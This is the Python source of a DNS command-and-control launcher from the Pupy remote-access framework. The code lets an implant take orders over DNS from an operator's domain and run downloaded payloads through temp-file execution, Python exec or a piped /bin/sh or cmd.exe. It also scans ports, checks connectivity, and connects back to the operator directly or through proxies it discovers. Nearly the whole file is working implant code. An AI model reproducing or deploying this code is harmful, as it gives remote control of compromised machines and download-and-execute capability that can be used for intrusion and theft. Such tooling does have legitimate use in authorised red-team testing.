# -*- coding: utf-8 -*-
# Copyright (c) 2016, Oleksii Shevchuk (alxchk@gmail.com)

from ..base_launcher import *
from ..picocmd import *

from ..proxies import get_proxies
from ..socks import GeneralProxyError, ProxyConnectionError, HTTPError
from ..clients import PupyTCPClient, PupySSLClient
from ..clients import PupyProxifiedTCPClient, PupyProxifiedSSLClient

from threading import Thread, Event, Lock

import socket
import os

import logging
import subprocess

from network.lib import online
from network.lib import scan

class DNSCommandClientLauncher(DnsCommandsClient):
    def __init__(self, domain):
        self.stream = None
        self.commands = []
        self.lock = Lock()
        self.new_commands = Event()

        try:
            from pupy_credentials import DNSCNC_PUB_KEY
            key = DNSCNC_PUB_KEY
        except:
            from pupylib.PupyCredentials import Credentials
            credentials = Credentials()
            key = credentials['DNSCNC_PUB_KEY']

        DnsCommandsClient.__init__(self, domain, key=key)

    def on_session_established(self):
        import pupy
        if hasattr(pupy, 'infos'):
            pupy.infos['spi'] = '{:08x}'.format(self.spi)

    def on_session_lost(self):
        import pupy
        if hasattr(pupy, 'infos'):
            del pupy.infos['spi']

    def on_downloadexec_content(self, url, action, content):
        self.on_pastelink_content(url, action, content)

    def on_pastelink_content(self, url, action, content):
        if action.startswith('exec'):
            with tempfile.NamedTemporaryFile() as tmp:
                tmp.write(content)
                tmp.flush()
                if not platform.system == 'Windows':
                    os.chmod(tmp.name, 0700)
                subprocess.check_output(tmp.name, stderr=subprocess.STDOUT)
        elif action.startswith('pyexec'):
            try:
                exec content
            except Exception as e:
                logging.exception(e)
        elif action.startswith('sh'):
            try:
                pipe = None
                if platform.system == 'Windows':
                    kwargs = {
                        'stdin': subprocess.PIPE
                    }

                    if hasattr(subprocess, 'STARTUPINFO'):
                        startupinfo = subprocess.STARTUPINFO()
                        startupinfo.dwFlags |= \
                          subprocess.CREATE_NEW_CONSOLE | \
                          subprocess.STARTF_USESHOWWINDOW

                        kwargs.update({
                            'startupinfo': startupinfo,
                        })

                    pipe = subprocess.Pipe('cmd.exe', **kwargs)
                else:
                    pipe = subprocess.Popen(['/bin/sh'], stdin=subprocess.PIPE)

                pipe.stdin.write(content)
                pipe.stdin.close()
                pipe.communicate()

            except Exception as e:
                logging.exception(e)

    def _checkconnect_worker(self, host, port_start, port_end):
        ports = xrange(port_start, port_end+1)
        connectable = scan.scan([str(host)], ports)
        while connectable:
            chunk = [ x[1] for x in connectable[:5] ]
            connectable = connectable[5:]
            self.event(ConnectablePort(host, chunk))

    def on_checkconnect(self, host, port_start, port_end):
        worker = Thread(target=self._checkconnect_worker, args=(
            host, port_start, port_end))
        worker.daemon = True
        worker.start()

    def _checkonline_worker(self):
        portquiz = online.PortQuiz()
        portquiz.start()

        result = online.check()
        self.event(OnlineStatus(result))

        portquiz.join()
        if portquiz.available:
            self.event(PortQuizPort(portquiz.available[:8]))

    def on_checkonline(self):
        worker = Thread(target=self._checkonline_worker)
        worker.daemon = True
        worker.start()

    def on_connect(self, ip, port, transport, proxy=None):
        logging.debug('connect request: {}:{} {} {}'.format(ip, port, transport, proxy))
        with self.lock:
            if self.stream and not self.stream.closed:
                logging.debug('ignoring connection request. stream = {}'.format(self.stream))
                return

            self.commands.append(('connect', ip, port, transport, proxy))
            self.new_commands.set()

    def on_disconnect(self):
        logging.debug('disconnect request [stream={}]'.format(self.stream))
        with self.lock:
            if self.stream:
                self.stream.close()
                self.stream = None

    def on_exit(self):
        with self.lock:
            if self.stream:
                self.stream.close()

        os._exit(0)

class DNSCncLauncher(BaseLauncher):
    ''' Micro command protocol built over DNS infrastructure '''

    credentials = [ 'DNSCNC_PUB_KEY' ]

    def __init__(self, *args, **kwargs):
        self.connect_on_bind_payload=kwargs.pop('connect_on_bind_payload', False)
        super(DNSCncLauncher, self).__init__(*args, **kwargs)

    def init_argparse(self):
        self.arg_parser = LauncherArgumentParser(
            prog='dnscnc', description=self.__doc__
        )

        self.arg_parser.add_argument(
            '--domain',
            metavar='<domain>',
            required=True,
            help='controlled domain (hostname only, no IP, '
               'you should properly setup NS first. Port is NOT supported)'
        )

    def parse_args(self, args):
        self.args = self.arg_parser.parse_args(args)
        self.set_host(self.args.domain)
        self.set_transport(None)

    def try_direct_connect(self, command):
        _, host, port, transport, _ = command
        t = network.conf.transports[transport](
            bind_payload=self.connect_on_bind_payload
        )

        client = t.client()
        s = None
        stream = None

        try:
            s = client.connect(host, port)
            stream = t.stream(s, t.client_transport, t.client_transport_kwargs)
        except socket.error as e:
            logging.error('Couldn\'t connect to {}:{} transport: {}: {}'.format(
                host, port, transport, e
            ))

        except Exception, e:
            logging.exception(e)

        return stream

    def try_connect_via_proxy(self, command):
        _, host, port, transport, connection_proxy = command
        if connection_proxy is True:
            connection_proxy = None

        for proxy_type, proxy, proxy_username, proxy_password in get_proxies(
               additional_proxies=[connection_proxy] if connection_proxy else None
        ):
            t = network.conf.transports[transport](
                bind_payload=self.connect_on_bind_payload
            )

            if t.client is PupyTCPClient:
                t.client = PupyProxifiedTCPClient
            elif t.client is PupySSLClient:
                t.client = PupyProxifiedSSLClient
            else:
                return

            s = None
            stream = None

            proxy_addr, proxy_port = proxy.rsplit(':', 1)

            try:
                client = t.client(
                    proxy_type=proxy_type.upper(),
                    proxy_addr=proxy_addr,
                    proxy_port=proxy_port,
                    proxy_username=proxy_username,
                    proxy_password=proxy_password
                )

                s = client.connect(host, port)
                stream = t.stream(s, t.client_transport, t.client_transport_kwargs)

            except (socket.error, GeneralProxyError, ProxyConnectionError, HTTPError) as e:
                if proxy_username and proxy_password:
                    proxy_auth = '{}:{}@'.format(proxy_username, proxy_password)
                else:
                    proxy_auth = ''

                logging.error('Couldn\'t connect to {}:{} transport: {} '
                                  'via {}://{}{}: {}'.format(
                    host, port, transport,
                    proxy_type, proxy_auth, proxy,
                    e
                ))

            except Exception, e:
                logging.exception(e)

            yield stream


    def iterate(self):
        import pupy

        if self.args is None:
            raise LauncherError('parse_args needs to be called before iterate')

        dnscnc = DNSCommandClientLauncher(self.host)
        dnscnc.daemon = True

        logging.info('Activating CNC protocol. Domain: {}'.format(self.host))
        dnscnc.start()

        exited = False

        while not exited:
            command = None

            with dnscnc.lock:
                if dnscnc.commands:
                    command = dnscnc.commands.pop()
                else:
                    dnscnc.new_commands.clear()

            if not command:
                dnscnc.new_commands.wait()
                continue

            if command[0] == 'connect':
                logging.debug('processing connection command')

                with dnscnc.lock:
                    if command[4]:
                        stream = None
                    else:
                        stream = self.try_direct_connect(command)

                    if not stream:
                        for stream in self.try_connect_via_proxy(command):
                            if stream:
                                break

                    dnscnc.stream = stream

                if stream:
                    logging.debug('stream created, yielding - {}'.format(stream))
                    pupy.infos['transport'] = command[3]

                    yield stream

                    with dnscnc.lock:
                        dnscnc.stream = None

                else:
                    logging.debug('all connection attempt has been failed')
